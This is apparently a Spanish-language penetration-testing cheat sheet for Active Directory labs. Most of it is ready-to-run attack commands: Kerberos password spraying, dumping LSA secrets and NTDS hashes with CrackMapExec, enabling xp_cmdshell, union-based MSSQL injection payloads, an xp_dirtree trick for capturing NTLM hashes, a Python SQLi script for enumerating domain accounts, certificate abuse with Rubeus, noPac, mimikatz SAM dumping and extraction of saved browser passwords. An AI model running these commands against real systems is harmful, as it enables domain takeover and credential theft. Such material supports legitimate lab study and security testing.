## Kerbrute

Mediante una lista de usuarios como pueden ser las de **SecLists** podemos ver usuarios válidos a nivel de dominio gracias a kerberos:

```shell
kerbrute userenum <USERLIST> --dc <HOSTNAME>.<DOMINIO> -d <DOMINIO>
```

Puede haber veces que un usuario tenga de contraseña su mismo nombre de usuario:

```shell
kerbrute bruteuser <USERLIST> --dc <HOSTNAME>.<DOMINIO> -d <DOMINIO> <USUARIO> 
```

Puede haber usuarios que tengan las mismas contraseñas:

```shell
./kerbrute passwordspray -d <DOMINIO> <LISTA_DE_USUARIOS> '<CONTRASEÑA>'
```
## Nmap

Esto está más claro que el agua:

```shell
nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n <IP> -oG allPorts
extractPorts allPorts
nmap -sCV -p<PUERTOS> <IP> -oN targeted
```
## SMB

### CrackMapExec

Podemos usar `crackmapexec` para enumerar los equipos del dominio y si tienen el **SMB** firmado:

```shell
crackmapexec smb <IP>/24
```

Otra cosa interesante es que si tenemos credenciales de un usuario que pertenece al grupo **Administradores** podemos dumpear el **LSA** o el **NTDS**.

Aquí el **LSA**, el cuál nos puede dar la contraseña de Administrador en texto claro:

```shell
crackmapexec smb <IP> -u '<USUARIO>' -p '<CONTRASEÑA>' --lsa
```

Y aquí el **NTDS** que nos da  todos los hashes del dominio:

```shell
crackmapexec smb <IP> -u '<USUARIO>' -p '<CONTRASEÑA>' --ntds vss
```

Con `crackmapexec` también podemos comprobar credenciales válidas por servicios ya sean **WinRM** o **SMB**:

```shell
crackmapexec winrm/smb <IP> -u '<USUARIO>' -p '<CONTRASEÑA>'
```

Con el parámetro `--shares` podemos enumerar todos los recursos compartidos a nivel de red, aunque yo prefiero usar `impacket-smbclient` para esta funcionalidad:

```shell
impacket-smbclient <DOMINIO>/'<USUARIO>':'CONRASEÑA'@<HOSTNAME>.<DOMINIO>
```

Pero también un punto fuerte de `crackmapexec` es que tiene el módulo `spider_plus` el cual ahorra mucho esfuerzo al momento de enumerar `shares`:

```shell
crackmapexec smb <IP> -u '<USUARIO>' -p '<CONTRASEÑA>' -M spider_plus
```

Otra cosita a destacar es el **PasswordSprying**. Te pongo en situación, tienes estas credenciales `edgar.jacobs:password#123`. Una cosa que puedes hacer es conectarte al **RPC** (ahora cubro ese punto) y sacar todos los usuarios del dominio. Guardas esos usuarios en una lista, por ejemplo `users.txt`, y se la pasas a `crackmapexec` seguida de la contraseña:

```shell
crackmapexec smb -u <USERLIST> -p '<CONTRASEÑA>' --continue-on-success
```

En caso de que tengamos algo como una tabla de excel en la que te dan ordenados los usuarios con su respectiva contraseña la sintaxis cambia un poco:

```shell
crackmapexec smb -u <USERLIST> -p <PASSWDLIST> --no-bruteforce --continue-on-success
```

El `--no-bruteforce` se le añade para que no pruebe todas las contraseñas para cada usuario si no para que pruebe el usuario de la línea 1 con la contraseña de la línea 1, el usuario de la 2 con la contraseña de la 2, etc.

En caso de que hayamos comprometido el entorno y queremos una interfaz gráfica, lo óptimo es entrar por **RDP**. Pero antes necesitamos habilitarlo:

```shell
crackmapexec smb <IP> -u '<USUARIO>' -p '<CONTRASEÑA>' -M rdp -o ACTION=enable
```

Ahora lo suyo es usar `xfreerdp` y conectarse:

```shell
xfreerdp /u:'<USUARIO>' /p:'<CONTRASEÑA>' /v:<HOSTNAME>.<DOMINIO> /cert:ignore /dynamic-resolution 
```

Moverse por `impacket-smbclient` es un coñazo, así que lo mejor es crearse una montura y ver todo más organizado:

```shell
mount -t cifs "//<IP>/<SHARE>" /mnt/<DIR>
```

Si queremos ver nuestros permisos de escritura/lectura en subdirectorios:

```shell
for dir in $(ls); do echo -e "\n[*] Enumerando permisos en el directorio $dir:\n"; echo -e "\t$(smbcacls "//10.10.10.103/Department Shares" Users/$dir -N | grep "Everyone")"; done
```

### Get-SMBShare & net

Enumerar SMB se puede hacer desde la propia máquina víctima:

```powershell
Get-SMBShare
```

Con `net` podemos especificar que recurso compartido a nivel de red queremos usar:

```powershell
net use \\<IP>\IPC$ /user:"<DOMINIO>"\"<USUARIO>" "<CONTRASEÑA>"
net view \\<IP>\
```

Vamos a listar el recurso "SYSVOL":

```powershell
net use x: \\<IP>\SYSVOL /user:"<DOMINIO>"\"<USUARIO>" "<CONTRASEÑA>"
```

Ahora podemos ir a `X:\` y empezar a enumerar.

### impacket-smbclient

```shell
impacket-smbclient <DOMINIO>/'<USUARIO>':'<CONTRASEÑA>'@<HOSTNAME>.<DOMINO>
```

### smbclient

```shell
smbclient -L <IP> -N
```

## RPC

### rpccclient

Si la `null session` está habilitada en el **RDP** del dominio podemos hacer uso de expresiones regulares para sacar todos los usuarios del dominio junto a sus descripciones y demás:

```shell
rpcclient -N -U '' <DOMINIO> -c enumdomusers | grep -oP '\[\D*?\]' | tr -d '[]' | tee <USERLIST>
```

Ahora para sacar las descripciones, las cuales algunas contienen contraseñas:

```shell
for user in $(cat <USERLIST>); do rpcclient -N -U "" <DOMINIO> -c "queryuser $user"; done | grep -E "User Name|Description"
```

### impacket-rpcmap

Si solo tenemos el puerto 135 abierto, tenemos que usar esta herramienta ya que `rpcclient` se intenta conectar al puerto 445 y 139, por lo que si no están abiertos no será muy útil:

```shell
impacket-rpcmap 'ncacn_ip_tcp:<IP>'
```

### impacket-rpcdump

También podemos listar los servicios con esta herramienta. En caso de ver el `spoolsv` tenemos una vía potencial de explotarlo:

```shell
impacket-rpcdump <DOMINIO>/<USUARIO>:'<CONTRASEÑA>'@<HOSTNAME> | cat -l java
```
## BloodHound

Desde la máquina atacante:

```shell
python3 bloodhound.py -u '<USUARIO>' -p '<CONTRASEÑA>' -d <DOMINIO> -dc <HOSTNAME>.<DOMINIO> -ns <IP> --dns-tcp --zip -c All
```

Desde la máquina víctima:

- Descargar `SharpHound.ps1`:

```shell
wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
```

- Subirlo a la máquina ya sea con un servidor de `SMB` o `upload` de `evil-winrm`.
-  Importar el módulo:

```powershell
Import-Module .\SharpHound.ps1
```

- Invocar a `BloodHound`

```powershell
Invoke-BloodHound -CollectionMethod All
```

Ahora queda descargar el `zip` y meterlo en `BloodHound`.

Como alternativa a estos dos en caso de que no funcionen, podemos usar [este](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) `SharpHound`:

```powershell
.\sharphound.exe -c all
```

Ahora queda descargar el `zip` nuevamente y meterlo en `BloodHound` , como siempre.
## LDAP

Para enumerar este servicio podemos usar la herramienta `ldapsearch`:

```shell
ldapsearch -H ldap://<IP> -x -s base namingcontexts
```

Si la respuesta nos devuelve algo así:

```shell
DC=<DOMINIO>,DC=<LOCAL,COM etc...>
```

Podemos seguir enumerando:

```shell
ldapsearch -H ldap://<IP> -x -b "DC=<DOMINIO>,DC=<LOCAL,COM etc...>"
```

Si tenemos credenciales, para `ldapsearch`:

```shell
ldapsearch -H ldap://<IP> -D '<USUARIO>@<DOMINIO>' -w '<CONTRASEÑA>' -x -b "DC=<DOMINIO>,DC=<LOCAL,HTB>"
```

Hay que tener en cuenta mirar cada usuario y descripción ya que pueden contener contraseñas.

En caso de tener credenciales válidas podemos hacer uso de `ldapdomaindump`:

```shell
ldapdomaindump -u '<DOMINIO>\<USUARIO>' -p '<CONTRASEÑA>' <IP>
```

Esto generará unos archivos `json, grep, html` que con un servidor web podemos ver en el navegador bien bonitos.

## MSSQL

### Navegación por tablas, bases de datos columnas, etc.

Listar bases de datos:

```sql
select name, database_id from sys.databases;
```

Listar tablas de base de datos:

```sql
SELECT TABLE_NAME FROM <DB>.INFORMATION_SCHEMA.TABLES;
```

Listar el contenido de columnas:

```sql
SELECT * from <DB>.dbo.<TABLA>;
```

> Una cosa importante: por ejemplo, si tienes credenciales `svc_mssql:#mssql_s3rv1c3!` y no funcionan, prueba con el usuario `sa`.

Aquí no solo podemos enumerar bases de datos, o si es vulnerable, SQLi, también podemos llegar a ejecutar comandos con el módulo `xp_cmdshell`:

```sql
xp_cmdshell "whoami"
```

En caso de que no nos deje por que esté deshabilitado, lo podemos habilitar:

```sql
xp_cmdshell "whoami"; SP_CONFIGURE "show advanced options" 1; RECONFIGURE; SP_CONFIGURE "xp_cmdshell", 1; RECONFIGURE
```

Otra cosa a tener en cuenta es que necesitamos credenciales, pero pueden estar habilitadas las de por defecto:

```plaintext
sa:RPSsql12345
```

Si hemos conseguido impersonar a Administrator gracias a un silver ticket, podemos hacer lo siguiente:

```shell
enable_xp_cmdshell
```

Y ya estaría.
Dejo por aquí un proyecto interesante que habla de un proxy con mssql:
https://github.com/blackarrowsec/mssqlproxy

```shell
python2 mssqlclient.py <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>
enable_ole
upload recyclator.dll C:\ProgramData\recyclator.dll
python2 mssqlclient.py <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP> -install -clr assembly.dll
python2 mssqlclient.py <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP> -start -reciclador 'C:\ProgramData\reciclador.dll'
```


## SQLi (MSSQL)

Situación: tenemos una web que es vulnerable a `SQLi`, así que podemos hacer algo así:

```sql
union select 1,2,3,4,5,6-- -
```

Los números tienes que ir probando a incrementarlos hasta que coincida con el número de columnas.
Si queremos ver la versión de **MSSQL** reemplazamos uno de los números por `@@version`:

```sql
union select 1,@@version,3,4,5,6-- -
```

Para ver el nombre de la base de datos:

```sql
union select 1,(SELECT DB_NAME()),3,4,5,6-- -
```

Y para ver todas las bases de datos:

```sql
union select 1,name,3,4,5,6 FROM master..sysdatabases;-- -
```

Con el nombre de la db podemos listar las tablas:

```sql
union select 1,name,3,4,5,6 FROM DB..sysobjects WHERE xtype = 'U';-- -
```

Para listar las columnas primero necesitamos saber el ID, se puede averiguar aprovechándonos del campo 3 ya que se muestra también en la web. En un caso diferente usa el campo correspondiente:

```sql
union select 1,name,id,4,5,6 FROM <DB>..sysobjects WHERE xtype = 'U';-- -
```

Sabiendo las tablas y su ID podemos listar sus columnas:

```sql
union select 1,name,3,4,5,6 FROM syscolumns WHERE id = <ID>;-- -
```

Bien! Ahora listemos el contenido de la columna:

```sql
union select 1,concat(column1,':',column2),3,4,5,6 FROM <TABLE>;-- -
```

Otra cosa que podemos hacer, es que al ser **MSSQL** con `xp_dirtree` nos podemos conectar a un recurso compartido a nivel de red. Si ese recurso no existe, con `Responder` podemos interceptar el hash NTLM:

```sql
; use master; exec xp_dirtree '\\10.10.X.X\smbFolder\anything';-- -
```

## Enumerar usuarios del dominio mediante SQLi

Si tenemos control de una vulnerabilidad SQLi, podemos listar usuarios del dominio aprovechándonos de esta vulnerabilidad:

```sql
union select 1,SUSER_SID('<DOMINIO>\Administrator'),3,4,5-- -
```

Si queremos ver el SID + RID, se nos mostrará en hexadecimal:

```sql
union select 1,(select sys.fn_varbintohexstr(SUSER_SID('<DOMINIO>\Administrator'))),3,4,5-- -
```

Esto otorgará una cadena en hexadecimal. Los primeros 48 caracteres son el SID, mientras que los restantes son el RID. Gracias a esto, podemos enumerar usuarios del dominio con el RID. Aquí os dejo un script en python hecho por 0xdf que nos permite enumerar usuarios del dominio gracias al RID con una SQLi:

```python
#!/usr/bin/env python3

import binascii
import requests
import struct
import sys
import time


payload_template = """test' UNION ALL SELECT 58,58,58,{},58-- -"""


def unicode_escape(s):
    return "".join([r"\u{:04x}".format(ord(c)) for c in s])


def issue_query(sql):
    while True:
        resp = requests.post(
            "http://10.10.10.179/api/getColleagues",
            data='{"name":"' + unicode_escape(payload_template.format(sql)) + '"}',
            headers={"Content-type": "text/json; charset=utf-8"},
            proxies={"http": "http://127.0.0.1:8080"},
        )
        if resp.status_code != 403:
            break
        sys.stdout.write("\r[-] Triggered WAF. Sleeping for 30 seconds")
        time.sleep(30)
    return resp.json()[0]["email"]


print("[*] Finding domain")
domain = issue_query("DEFAULT_DOMAIN()")
print(f"[+] Found domain: {domain}")

print("[*] Finding Domain SID")
sid = issue_query(f"master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\Domain Admins'))")[:-8]
print(f"[+] Found SID for {domain} domain: {sid}")

for i in range(500, 10500):
    sys.stdout.write(f"\r[*] Checking SID {i}" + " " * 50)
    num = binascii.hexlify(struct.pack("<I", i)).decode()
    acct = issue_query(f"SUSER_SNAME({sid}{num})")
    if acct:
        print(f"\r[+] Found account [{i:05d}]  {acct}" + " " * 30)
    time.sleep(1)

print("\r" + " " * 50)
```

## SQLCMD

Si disponemos de credenciales y `sqlcmd` está instalado en la máquina, nos podemos conectar a otras bases de datos:

```powershell
sqlcmd -U <USUARIO> -P "<CONTRASEÑA>" -S localhost -d <DB> -Q <QUERY>
```

## Web

Podemos usar tres herramientas para esto:

### Directorios

- Gobuster
	- HTTP:

```shell
gobuster dir -u http://url/of/the/target/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 250
```

>Para HTTPS sería solo añadirle `-k` después de la url

- Wfuzz

```shell
wfuzz -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://url/of/target/FUZZ -t 100 --hc <STATUS CODE (404,403)>
```

- FeroxBuster:

```shell
feroxbuster -u http://url/of/target/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
```


### Subdominios

- Gobuster:

```shell
gobuster vhost -u <DOMINIO> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 250
```

- Wfuzz

```shell
wfuzz -u https://url -H "Host: FUZZ.<DOMINIO>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315
```


## WinPEAS

Esto es fácil, solo hay que descargarse `winPEAS`, subirlo a la máquina y ejecutar:

```c
.\winPEAS.exe
```

Hay que tener en cuenta que podemos filtrar por cosas interesantes como AutoLogon passwords con findstr. Si te devuelve "AutoLogon passwords found", perfecto.

## LAPS

Este servicio administra contraseñas de usuarios locales, por lo que si de alguna forma podemos leer este servicio, podríamos leer contraseñas de Administradores. Haremos uso de [esta](https://github.com/kfosaaen/Get-LAPSPasswords) herramienta:

```powershell
Get-LAPSPasswords
```

Esto mostrará muchas contraseñas, es cosa de probar todas :)
Otra forma de hacerlo sin esa herramienta es así:

```powershell
Get-ADComputer <HOSTNAME> -property 'ms-mcs-admpwd'
```

## PowerShell history

Otra cosa interesante es leer el historial de PowerShell, ya que puede ser que un usuario se haya conectado con `EnterPSSession` u otra cosa:

```powershell
type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## FTP

Si el inicio de sesión anónimo está habilitado, `nmap` debería reportarlo. En caso de que si hacemos `ls` se quede colgado, debemos seguir los siguientes comandos:

```shell
ftp> passive
Passive mode: on; fallback to active mode: on.
ftp> ls
```

## Certificados

Empezaremos usando la herramienta [certify.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe) junto a [rubeus.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe). También necesitamos [ADCS.ps1](https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1) y [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)

```powershell
.\certify.exe find /vulnerable /currentuser
```

Si encuentra una vulnerable, la idea es crear uno impersonando al usuario Administrator y luego con rubeus ver su hash NT:

```powershell
Get-SmartcardCertificate -Identity Adminisrtator -TemplateName <TEMPLATE> -NoSmartcard -Verbose 
```

Luego ejecutamos `cgi` y si tenemos un certificado, perfect:

```shell
gci cert:\currentuser\my -verbose 
```

Ahora teniendo esto, con rubeus tratamos de obtener el hash NT de administrador:

```shell
.\Rubeus.exe asktgt /user:Administrator /certificate:0B76189248DE4A98A6CC7863105DE6E78CA51808 /getcredentials
```

En caso de que esto no funcione, podemos hacer lo siguiente:

```shell
git clone https://github.com/Ridter/noPac.git
cd noPac
pip3 install -r requirements.txt
python3 noPac.py <DOMINIO>/<USUARIO>:<CONTRASEÑA> -dc-ip <IP> -dc-host <HOSTNAME> -shell --impersonate administrator
```





## Procesos

Esto se puede efectuar con el comando:

```powershell
Get-Process
```

## PowerView

Antes de nada debemos convertir a SecureString la contraseña:

```powershell
$pass = ConvertTo-SecureString "<CONTRASEÑA>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<DOMINIO>\<USUARIO>", $pass)
```

- Enumerar usuarios:

```powershell
Get-DomainUser -Credential $cred
```

>Fíjate en las descripciones de los usuarios

- Enumerar ordenadores:

```powershell
Get-DomainComputer -Credential $cred -DomainController <HOSTNAME>.<DOMINIO> | Select DNSHostname 
```
## DNS

```shell
 dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-bitquark-intelligence.htb intelligence.htb dnsenum VERSION:1.2.6
 ```
## Listar servicios

```shell
impacket-rpcdump <DOMINIO>/<USUARIO>:'<CONTRASEÑA>'@<HOSTNAME>.<DOMINO>
```

Pero esto también se puede hacer con powershell de tres formas:

```powershell
Get-Service
```

o...

```powershell
Get-WmiObject win32_service
```

Y esta que suele funcionar:

```powershell
cd HKLM:SYSTEM\CurrentControlSet\Services 
dir
```

Y ahora puedes filtrar por lo que te interese :D
## Shadow copies

Para listar las shadow copies:

```powershell
vssadmin list shadow
```

Creamos link simbólico:

```powershell
cmd /c mklink /d C:\VSS \\?\path\to\shadow\copy\
```

Y con mimikatz dumpeamos la sam de la copia:

```powershell
lsadump::sam /system:C:\VSS\Windows\System32\config\SYSTEM /sam:C:\VSS\Windows\System32\config\SAM
```

## Edge Files

La gente también suele almacenar cosas como credenciales en sus navegadores, por eso es importante mirar la ruta `C:\users\bob.wood\AppData\local\Microsoft\Edge\User Data\Default\` con los archivos `Local State` y `Login Data`. Podemos automatizar esto con la herrameinta [SharpChromium](https://github.com/djhohnstein/SharpChromium) de SharpCollection:

```powershell
*Evil-WinRM* PS C:\Windows\Debug\wia> .\scium.exe logins
[*] Beginning Edge extraction.

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://somewhere.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SemTro32756Gff

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://google.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SomeSecurePasswordIGuess!09

--- Chromium Credential (User: Bob.Wood) ---
URL      : http://webmail.windcorp.com/action_page.php
Username : bob.woodADM@windcorp.com
Password : smeT-Worg-wer-m024

[*] Finished Edge extraction.

[*] Done.
*Evil-WinRM* PS C:\Windows\Debug\wia> 
```

## Usuarios mediante SID

```shell
impacket-lookupsid <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>
```

## PowerUp

Este módulo es muy útil. Os dejo [aquí](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1). Digo que es muy útil por que es una gran herramienta de enumeración concentrada. Entre esto y el winPEAS es muy difícil que no encuentres formas de escalar privilegios:

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

